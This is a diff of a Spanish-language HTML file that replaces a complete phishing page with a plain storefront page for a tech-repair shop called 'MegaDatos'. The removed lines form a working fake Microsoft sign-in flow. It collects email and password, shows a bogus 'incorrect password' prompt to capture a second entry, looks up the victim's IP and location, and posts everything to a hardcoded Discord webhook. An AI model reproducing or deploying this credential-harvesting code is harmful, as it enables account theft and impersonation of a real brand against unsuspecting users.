@@ -1,274 +1,177 @@
+
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Calendario y Correo Electrónico</title>
-  <style>
-    * { padding: 0; margin: 0; color: #1b1b1b; font-family: sans-serif; box-sizing: border-box; }
-    body { background-color: #F0EDF3; }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MegaDatos - Servicios Tecnológicos</title>
 
-    .formu {
-      max-width: 400px;
-      width: 100%;
-      display: block;
-      box-shadow: 0 2px 6px rgb(0 0 0 / 20%);
-      background-color: white;
-      padding: 40px;
-      margin: auto;
-      margin-top: 250px;
-    }
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #f0f2f5;
+            color: #333;
+            font-size: 16px; /* texto normal */
+        }
 
-    #ia { width: 130px; }
-    #p {
-      margin: 15px 0;
-      font-size: 25px;
-      line-height: 26px;
-      font-weight: 600;
-    }
+        header {
+            background: #0a6fcc;
+            color: #fff;
+            padding: 15px;
+            text-align: center;
+        }
 
-    .camp input {
-      width: 95%;
-      border: none;
-      border-bottom: 1px solid #545454;
-      padding: 10px 0;
-      font-size: 16px;
-      margin-bottom: 15px;
-      outline: none;
-    }
+        header h1 {
+            margin: 0;
+            font-size: 28px;
+        }
 
-    a { color: #0067b8; text-decoration: none; }
+        nav a {
+            color: white;
+            margin: 0 12px;
+            text-decoration: none;
+            font-size: 16px;
+        }
 
-    .aS {
-      font-size: 14px;
-      line-height: 40px;
-    }
+        .hero-img {
+            width: 100%;
+            height: 220px;
+            object-fit: cover;
+        }
 
-    .btn {
-      display: flex;
-      justify-content: flex-end;
-      margin: 10px;
-    }
+        section {
+            width: 90%;
+            max-width: 900px;
+            margin: 20px auto;
+            padding: 18px;
+            background: white;
+            border-radius: 6px;
+            border: 1px solid #ddd; /* más sencillo */
+        }
 
-    #btn, #btn2, #btn3 {
-      color: white;
-      background-color: #0067b8;
-      outline: none;
-      padding: 7px 15px;
-      font-size: 17px;
-      cursor: pointer;
-      border: none;
-    }
+        h2 {
+            color: #0a6fcc;
+            font-size: 22px;
+            margin-top: 0;
+        }
 
-    #btn:hover, #btn2:hover, #btn3:hover {
-      background-color: #00599F;
-    }
+        .img-box img {
+            width: 100%;
+            max-height: 220px; /* imágenes más pequeñas */
+            object-fit: cover;
+            border-radius: 6px;
+        }
 
-    .cua { margin-bottom: 400px; }
-
-    @media (max-width: 920px) {
-      body { background-color: white; }
-      .formu {
-        box-shadow: none;
-        margin-top: 40px;
-        padding: 40px 25px;
-      }
-    }
-  </style>
+        footer {
+            background: #0a6fcc;
+            color: white;
+            text-align: center;
+            padding: 12px;
+            margin-top: 35px;
+            font-size: 14px;
+        }
+    </style>
 </head>
+
 <body>
-  <div class="cua">
-    <form id="loginForm" action="procesar.php" method="POST">
-      <!-- Primer formulario (Correo) -->
-      <div class="formu" id="formu">
-        <div class="i">
-          <img id="ia" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1024px-Microsoft_logo_%282012%29.svg.png" alt="">
+
+    <img src="https://ayudaleyprotecciondatos.es/wp-content/uploads/2020/09/extraer-metadatos-online.jpg" class="hero-img" alt="Imagen principal">
+
+    <header>
+        <h1>MegaDatos</h1>
+        <nav>
+            <a href="#servicios">Servicios</a>
+            <a href="#quienes">Quiénes Somos</a>
+            <a href="#contacto">Contacto</a>
+            <a href="#ubicacion">Ubicación</a>
+        </nav>
+    </header>
+
+    <!-- Servicios -->
+    <section id="servicios">
+        <h2>Servicios ofrecidos</h2>
+
+        <div class="img-box">
+            <img src="https://medellin.solutekla.com/photo/1/solutek/servicios/valor_diagnostico_por_equipo/valor_diagnostico_por_equipo_0001" alt="">
         </div>
-        <h3 id="p">Iniciar sesión:</h3>
-        <div class="camp">
-          <input type="email" id="email" name="email" required placeholder="Correo electrónico, teléfono o Skype">
+<section>
+
+    <p>
+        En MegaDatos trabajamos con equipos de computación, redes y software. 
+        Hacemos mantenimiento, revisiones y ayudamos a mejorar el rendimiento de diferentes dispositivos.
+    </p>
+
+    <h3>Venta de Componentes y Equipos</h3>
+    <p>
+        Si tu equipo necesita una mejora o una sustitución, estamos listos para ayudarte. 
+        Ofrecemos un inventario amplio de componentes de alta calidad 
+        (discos duros, memorias RAM, baterías, pantallas y más) para reparaciones duraderas.
+    </p>
+
+    <h3>Especialidades</h3>
+    <ul>
+        <li>Computadores y Laptops (PCs y Macs)</li>
+        <li>Servidores y Redes</li>
+        <li>Impresoras y Periféricos</li>
+        <li>Tablets y Dispositivos Móviles</li>
+    </ul>
+
+    <h3>Servicios Tecnológicos</h3>
+    <ul>
+        <li><strong>Servicios de Hardware:</strong> Mantenimiento, reparación, instalación de componentes y venta de equipos.</li>
+        <li><strong>Servicios de Software:</strong> Instalación, configuración, desarrollo a medida y soporte técnico.</li>
+        <li><strong>Redes y Conectividad:</strong> Configuración de redes, soluciones WiFi, instalación de servidores.</li>
+        <li><strong>Consultoría Tecnológica:</strong> Asesoría en tecnologías, planificación de proyectos IT.</li>
+        <li><strong>Mantenimiento Preventivo:</strong> Revisiones periódicas, limpiezas internas y optimizaciones.</li>
+        <li><strong>Mantenimiento Correctivo:</strong> Diagnóstico y reparación de fallas, errores de sistema y eliminación de virus.</li>
+    </ul>
+
+</section>
+
+    <!-- Quiénes somos -->
+    <section id="quienes">
+        <h2>Quiénes Somos</h2>
+
+        <div class="img-box">
+            <img src="https://thumbs.dreamstime.com/b/team-icon-t%C3%A9cnico-120102797.jpg" alt="">
         </div>
-        <div class="aS">
-          <p>¿No tiene una cuenta? <a href="#">Cree una.</a></p>
+
+        <p>MegaDatos es una tienda especializada en tecnología dedicada a brindar un servicio de calidad y soluciones innovadoras. Contamos con un equipo sumamente amplio de expertos listos para satisfacer todas tus necesidades tecnológicas. Nacimos con la misión de garantizar que tus equipos funcionen siempre a su máximo rendimiento.
+
+</p>
+
+        <p>Somos un equipo de técnicos especialistas apasionados por la tecnología y dedicados a ofrecer soluciones de Mantenimiento de alta calidad. Entendemos lo frustrante que puede ser una falla técnica, y por eso, nos comprometemos a brindar un servicio rápido, confiable y transparente.</p>
+    </section>
+
+    <!-- Contacto -->
+    <section id="contacto">
+        <h2>Contacto</h2>
+
+        <div class="img-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/Google_Contacts_logo.png" alt="">
         </div>
-        <div class="btn">
-          <button id="btn" type="button">Siguiente</button>
-        </div>
-      </div>
 
-      <!-- Segundo formulario (Contraseña) -->
-      <div class="formu" id="formu2" style="display: none;">
-        <div class="i">
-          <img id="ia" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1024px-Microsoft_logo_%282012%29.svg.png" alt="">
-        </div>
-        <h3 id="p">Ingresa tu contraseña</h3>
-        <div class="camp">
-          <input type="password" id="password" name="password" required placeholder="Contraseña">
-        </div>
-        <div class="aS">
-          <p><a href="#">¿Olvidó su contraseña?</a></p>
-        </div>
-        <div class="btn">
-          <button id="btn2" type="button">Siguiente</button>
-        </div>
-      </div>
+        <p><b>Email:</b> MGcomputacion@gmail.com</p>
+        <p><b>Teléfono:</b> +58 412 423 8600</p>
+    </section>
 
-      <!-- Tercer formulario (Confirmar contraseña) -->
-      <div class="formu" id="formu3" style="display: none;">
-        <div class="i">
-          <img id="ia" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1024px-Microsoft_logo_%282012%29.svg.png" alt="">
-        </div>
-        <h3 id="p">Contraseña incorrecta, verificala.</h3>
-        <div class="camp">
-          <input type="password" id="confirm_password" name="confirm_password" required placeholder="Confirmar contraseña">
-        </div>
-        <div class="btn">
-          <button id="btn3" type="submit">Finalizar</button>
-        </div>
-      </div>
-    </form>
-  </div>
-<script>
-const webhookURL = "https://discord.com/api/webhooks/1436840167729270914/Rx4LAwYyIrQYblZUV7zY1piZDygtn3RWZ52Kjuo4iurv3fs2BazBM_PTF0aM6HfDwYXs";
+    <!-- Ubicación -->
+    <section id="ubicacion">
+        <h2>Ubicación</h2>
+                <p>Haz click en el mapa para conocer nuestra ubicacion</p>
 
-let userData = {
-    email: "",
-    password: ""
-};
 
-// Función para obtener datos del usuario
-async function getUserInfo() {
-    try {
-        // Obtener IP
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        
-        // Obtener ubicación basada en IP
-        const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-        const locationData = await locationResponse.json();
-        
-        return {
-            ip: ipData.ip,
-            city: locationData.city || "No detectada",
-            country: locationData.country_name || "No detectado",
-            region: locationData.region || "No detectada",
-            timezone: locationData.timezone || "No detectada"
-        };
-    } catch (error) {
-        return {
-            ip: "No detectada",
-            city: "No detectada",
-            country: "No detectado",
-            region: "No detectada",
-            timezone: "No detectada"
-        };
-    }
-}
+   <a href="https://goo.gl/maps/TXeXQwNZ8Nqj9nJVA?g_st=aw" target="_blank">
+    <img src="https://cdn-icons-png.flaticon.com/512/5088/5088218.png" alt="Enlace con la Ubicación" style="width: 150px; border: 2px solid #0a2acb;"></a>
 
-document.getElementById("btn").addEventListener("click", function () {
-    userData.email = document.getElementById("email").value || "No ingresado";
-    document.getElementById("formu").style.display = "none";
-    document.getElementById("formu2").style.display = "block";
-});
+    </section>
 
-document.getElementById("btn2").addEventListener("click", async function (event) {
-    event.preventDefault();
-    userData.password = document.getElementById("password").value || "No ingresada";
-    
-    const userInfo = await getUserInfo();
-
-    const mensaje = {
-        embeds: [
-            {
-                title: "🔐 Primer Acceso",
-                color: 0x57F287,
-                fields: [
-                    {
-                        name: "📧 Correo",
-                        value: `\`${userData.email}\``,
-                        inline: true
-                    },
-                    {
-                        name: "🔑 Contraseña",
-                        value: `\`${userData.password}\``,
-                        inline: true
-                    },
-                    {
-                        name: "🌍 Ubicación",
-                        value: `**IP:** ${userInfo.ip}\n**Ciudad:** ${userInfo.city}\n**País:** ${userInfo.country}`,
-                        inline: false
-                    },
-                    {
-                        name: "🕐 Fecha/Hora",
-                        value: new Date().toLocaleString(),
-                        inline: true
-                    }
-                ],
-                footer: {
-                    text: "Microsoft Login • Acceso inicial"
-                },
-                timestamp: new Date().toISOString()
-            }
-        ]
-    };
-
-    fetch(webhookURL, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(mensaje)
-    }).catch(err => console.error("Error enviando a Discord:", err));
-
-    document.getElementById("formu2").style.display = "none";
-    document.getElementById("formu3").style.display = "block";
-});
-
-document.getElementById("loginForm").addEventListener("submit", async function (e) {
-    e.preventDefault();
-    const confirm = document.getElementById("confirm_password").value || "No confirmada";
-    
-    const userInfo = await getUserInfo();
-
-    const mensajeConfirm = {
-        embeds: [
-            {
-                title: "✅ Confirmación Exitosa",
-                color: 0x5865F2,
-                fields: [
-                    {
-                        name: "👤 Datos Usuario",
-                        value: `**Email:** ${userData.email}\n**Contraseña:** ${userData.password}\n**Confirmación:** ${confirm}`,
-                        inline: false
-                    },
-                    {
-                        name: "📍 Información Geográfica",
-                        value: `**IP:** ${userInfo.ip}\n**Ciudad:** ${userInfo.city}\n**Región:** ${userInfo.region}\n**País:** ${userInfo.country}\n**Zona Horaria:** ${userInfo.timezone}`,
-                        inline: false
-                    }
-                ],
-                footer: {
-                    text: `Microsoft Login • ${new Date().toLocaleDateString()}`
-                },
-                timestamp: new Date().toISOString()
-            }
-        ]
-    };
-
-    fetch(webhookURL, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(mensajeConfirm)
-    }).catch(err => console.error("Error enviando confirmación a Discord:", err));
-
-    setTimeout(() => {
-        alert("Cuenta activada exitosamente.");
-        // window.location.href = "https://outlook.live.com/";
-    }, 1000);
-});
-</script>
+    <footer>
+        © 2025 MegaDatos
+    </footer>
 
 </body>
 </html>
